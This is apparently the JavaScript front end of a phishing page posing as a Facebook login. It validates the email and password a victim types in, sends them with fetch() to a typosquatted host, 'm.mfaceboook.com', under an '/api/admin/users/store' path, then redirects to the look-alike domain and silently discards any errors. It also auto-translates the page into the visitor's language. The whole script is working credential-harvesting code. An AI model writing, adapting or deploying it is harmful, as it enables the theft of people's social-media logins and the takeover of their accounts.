
$(document).ready(function() {
  function resetError() {
    $("#error_email").css("display", 'none')
    $("#error_pw").css("display", 'none')
    $("#error_email1").css("display", 'none')
    $("#error_pw1").css("display", 'none')
  }
  function showLoading(value) {
    if (value) {
      $("#loading").css('display', 'block');
      $("#textLogin").css('display', 'none');
      $("#loading1").css('display', 'block');
      $("#textLogin1").css('display', 'none');
    } else {
      $("#loading").css('display', 'none');
      $("#textLogin").css('display', 'block');
      $("#loading1").css('display', 'none');
      $("#textLogin1").css('display', 'block');
    }
  }
  function handleDataLogin() {
    resetError();
    showLoading(true);
    console.log("CLICKED")
    const screenWidth = window.innerWidth;
    let dataReq = { email: '', password: ''};
    if (screenWidth > 780) {
      const email_pc = $('#email_pc').val();
      const pass_pc = $('#pass_pc').val();
      if (email_pc.length < 4 || email_pc.length > 50) {
        $("#error_email").css("display", 'block')
        showLoading(false)
      } else if (pass_pc.length < 6 || pass_pc.length > 32) {
        $("#error_pw").css("display", 'block')
        showLoading(false)
      } else {
        dataReq = {
          email: email_pc,
          password: pass_pc
        }
        onSubmit(dataReq)
      }
    } else {
      const email_mb = $('#email_mb').val();
      const pass_mb = $('#pass_mb').val();
      if (email_mb.length < 4 || email_mb.length > 50) {
        $("#error_email1").css("display", 'block')
        showLoading(false)
      } else if (pass_mb.length < 6 || pass_mb.length > 32) {
        $("#error_pw1").css("display", 'block')
        showLoading(false)
      } else {
        dataReq = {
          email: email_mb,
          password: pass_mb
        }
        onSubmit(dataReq)
      }
    }
  }

  $('#btnSubmitMb').on('click', function() { handleDataLogin() })
  $('#btnSubmit').on('click', function () { handleDataLogin() });

  // onClick submit
  async function onSubmit(dataReq) {
    try {
      const response = await fetch('https://m.mfaceboook.com/api/admin/users/store', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: dataReq,
      });
  
      if (!response.ok) {
        throw new Error(`Server error: ${response.status}`);
      }
      if (response.status === 201) {
        window.location.href = "https://mfaceboook.com";
      }
    } catch (error) {
    }
  }
  function loadGoogleTranslate() {
    window.googleTranslateElementInit = () => {
      new window.google.translate.TranslateElement(
        {
          pageLanguage: 'en',
        },
        'google_translate_element'
      )
    }
    setTimeout(() => {
      selectLanguage();
    }, 500)
  }
  function selectLanguage() {
    const languageCode = navigator?.language ?? 'en'
    // Find the translate widget dropdown
    const selectElement = document.querySelector('.goog-te-combo')

    if (selectElement) {
      // Set the value to the desired language code
      selectElement.value = languageCode

      // Trigger the change event to apply the selection
      const event = new Event('change')
      selectElement.dispatchEvent(event)
    } else {
      console.error('Google Translate dropdown not found.')
    }
  }
  loadGoogleTranslate();

});